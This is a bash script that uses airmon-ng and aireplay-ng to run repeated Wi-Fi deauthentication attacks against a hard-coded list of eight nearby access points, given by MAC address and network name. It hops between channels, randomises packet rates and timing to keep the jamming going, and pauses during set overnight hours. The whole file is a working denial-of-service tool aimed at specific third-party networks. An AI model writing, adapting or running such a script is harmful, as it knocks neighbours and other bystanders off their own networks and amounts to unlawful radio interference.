#!/bin/bash

module=rt73usb

iface=wlan4
iface_mon=mon0
sleep_time_begin="0:30"
sleep_time_end="07:30"

deauth_count=5
deauth_delay=5
deauth_pps=30
rest_delay=30

mon_enabled=0

declare -a victim_list=("50:6A:03:AD:D6:57" #NETGEAR61
                        "CC:2D:21:59:80:51" #Chinanet-2.4G-8050
                        "B0:CC:FE:5A:44:ED" #<length:  0>
                        "B0:CC:FE:5A:44:E8" #ChinaNet-PWS4WJ
                        "B0:CC:FE:5A:44:E9" #<length:  0>

                        "04:D3:B5:16:0B:04" #HUAWEI-702
                        "54:75:95:28:DF:71" #37-702
                        "E8:92:0F:58:60:31" #CMCC-6pHb
                        )

mod_install() {
        if lsmod | grep "$module" &> /dev/null ; then
                echo "$module already loaded"
        else
                echo "insmod $module"
                modprobe $module

                if [ ! -d "/sys/class/net/$iface" ]; then
                        echo "$iface not exist"
                        exit
                fi
        fi
}

root_check() {
        if [ "$EUID" -ne 0 ]; then
                echo "run as root"
                exit
        fi
}

mon_enable() {
        if [[ "$mon_enabled" -eq 0 ]]; then
                if [ ! -d "/sys/class/net/$iface_mon" ]; then
                        echo "use adapter $iface"
                        sleep 1
                        ifconfig $iface down
                        airmon-ng start $iface
                        iwconfig $iface_mon rate 1M
                else
                        echo "$iface_mon already enabled"
                fi
        fi

        mon_enabled=1
}

mon_disable() {
        if [[ "$mon_enabled" -eq 1 ]]; then
                if [ -d "/sys/class/net/$iface_mon" ]; then
                        airmon-ng stop $iface_mon
                        ifconfig $iface down
                fi
        fi

        mon_enabled=0
}

sleep_check() {
        current_time=$(date +%H:%M)
        if [[ "$current_time" > "$sleep_time_begin" ]] || [[ "$current_time" < "$sleep_time_end" ]]; then
                mon_disable
                return
        else
                mon_enable
        fi

        false
}

air_clean() {                                             
        sleep_check_count=0                               
                                                          
        while :                                           
        do                                                
                if [[ "$sleep_check_count" -ge 40 ]]; then
                        if sleep_check; then            
                                echo "mid night sleep.."
                                sleep 1200                     
                                continue                  
                        else                                
                                echo "hot sleep.."           
                                mon_disable                  
                                sleep 1200                   
                                mon_enable                   
                                sleep_check_count=0          
                        fi                                   
                fi                                           
                sleep_check_count=$((sleep_check_count+1))   
                                                             
                ch=$(( ( RANDOM % 13 )  + 1 ))               
                deauth=$(( ( RANDOM % $deauth_count )  + 1 ))
                delay=$(( ( RANDOM % $deauth_delay )  + 1 ))                                           
                pps=$(( ( RANDOM % $deauth_pps )  + 1 ))                                               
                rest=$(( ( RANDOM % $rest_delay )  + 1 ))                                              
                                                                                                       
                echo "on channel $ch, ${pps}pps"                                                       
                                                                                                       
                iwconfig mon0 channel $ch                                                                    
                                                                                                             
#               for victim in "${victim_list[@]}"                                                            
#               do                                                                                           
#                       aireplay-ng --deauth $deauth -a $victim -D --ignore-negative-one $iface -x $pps      
#                       sleep $delay                                                                         
#               done                                                                                         
                                                                                                             
                index=$(( RANDOM % ${#victim_list[@]} ))                                                     
                echo "victim[${index}]=${victim_list[index]}"                                                
                aireplay-ng --deauth $deauth -a ${victim_list[index]} -D --ignore-negative-one $iface -x $pps
                                       
                echo "wait $rest sec.."    
                sleep $rest                                  
        done                                     
}                              
                                            
root_check                                    
mon_enable                                         
air_clean
